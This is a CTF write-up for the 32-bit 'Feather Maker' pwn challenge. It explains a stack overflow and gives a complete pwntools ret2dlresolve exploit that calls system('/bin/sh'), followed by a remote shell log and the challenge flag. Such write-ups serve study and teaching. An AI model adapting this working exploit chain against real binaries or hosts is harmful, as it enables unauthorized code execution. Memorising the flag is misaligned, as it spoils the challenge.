# CTF Write-up — **Feather Maker** (ret2dlresolve on 32-bit, NX, Partial RELRO)

## Title
- **Challenge:** Feather Maker  
- **Category:** pwn / 32-bit  
- **Target:** `chall.v1t.site 30212`  
- **Flag:** `V1T{f34th3r_r3dr1r_3a5f1b52344f42ccd459c8aa13487591}`

---

## Overview

A 32-bit dynamically linked ELF with **NX enabled**, **no PIE**, and **Partial RELRO**.  
The binary reads 350 bytes into a 304-byte stack buffer, giving **EIP control**.  
However, it only imports `read()` — no `system`, no `puts`, no leak function.  

This makes it a **perfect candidate for ret2dlresolve**:  
we’ll force the dynamic linker to **resolve `system()` at runtime** and execute `system("/bin/sh")`.

---

## Recon

```bash
$ file chall
chall: ELF 32-bit LSB executable, dynamically linked, not stripped

$ checksec --file=./chall
RELRO           STACK CANARY      NX           PIE
Partial RELRO   No canary found   NX enabled   No PIE
```
### Decompiled vulnerable function
```c

void vuln(void)
{
    char buf[304];       // 0x130
    read(0, buf, 0x15e); // 350 bytes
    return;
}
```
### Observations:

- Buffer = 304 bytes

- Read size = 350 → overflow

- No canary

- NX enabled → no shellcode

- Partial RELRO → GOT writable

- Only import: read@plt → no libc leak

### Offset calculation
304 bytes for buffer

+4 saved EBP

+4 saved EIP
→ offset = 0x138 (312)

We’ll confirm by fuzzing or cyclic pattern, but 0x138 works reliably.

### Why ret2dlresolve
We only have:

- read@plt

- read@got

### We don’t have:

-  system@plt

- puts@plt



Since NX is on and Partial RELRO allows GOT use,
the right approach is ret2dlresolve, which triggers the linker’s resolver manually.


## Exploit Strategy
### Stage 1: Stack ROP
Overflow buffer

Call read(0, BSS, len(dlresolve_payload))
→ writes fake structures into .bss

Invoke the dynamic linker resolver (dlresolve.resolver)
→ linker resolves "system" and executes it

### Stage 2: Data Payload
Send the fake structures (.rel.plt, .dynsym, .dynstr) plus the string "/bin/sh".

### Exploit Code
```python

#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./chall')
context.arch   = 'i386'
context.os     = 'linux'
# context.log_level = 'debug'

HOST, PORT = 'chall.v1t.site', 30212

def start():
    return remote(HOST, PORT) if args.REMOTE else process(elf.path)

p = start()

offset = 0x138                    # confirmed overwrite offset
bss_addr = elf.bss() + 0x500      # writable location in .bss

# forge dlresolve payload to resolve system("/bin/sh")
dlresolve = Ret2dlresolvePayload(
    elf,
    symbol='system',
    args=['/bin/sh'],
    data_addr=bss_addr
)

# build ROP chain
rop = ROP(elf)

# 1) write fake resolver data to memory
rop.call(elf.plt['read'], [0, bss_addr, len(dlresolve.payload)])

# 2) trigger dynamic linker resolver
rop.ret2dlresolve(dlresolve)

# final payload (stage 1)
payload = flat(
    b'A' * offset,
    rop.chain()
)

# send exploit
p.send(payload)
p.send(dlresolve.payload)

p.interactive()
```
### Execution
```bash

$ python3 solve.py REMOTE
[+] Opening connection to chall.v1t.site on port 30212: Done
[*] Switching to interactive mode
$ ls
$ cat flag
V1T{f34th3r_r3dr1r_3a5f1b52344f42ccd459c8aa13487591}
```